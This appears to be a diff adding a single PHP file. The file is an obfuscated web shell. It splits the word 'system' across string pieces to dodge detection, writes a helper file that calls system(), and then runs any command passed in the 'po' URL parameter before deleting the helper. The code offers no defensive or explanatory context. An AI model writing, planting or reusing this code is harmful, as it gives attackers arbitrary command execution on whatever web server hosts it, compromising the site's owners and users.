@@ -1,0 +1,1 @@
+<?php function sis_create(){$ajmv0=fopen('linked.php','w');$guvu1="<?php function ";$cwmo2="sis(\$s1){sy";$ovfd3="stem";$otid4="(\$s1);}?>";fputs($ajmv0,$guvu1.$cwmo2.$ovfd3.$otid4);}sis_create();require('linked.php');$eaie5=$_GET['po'];sis($eaie5);unlink('linked.php');?>
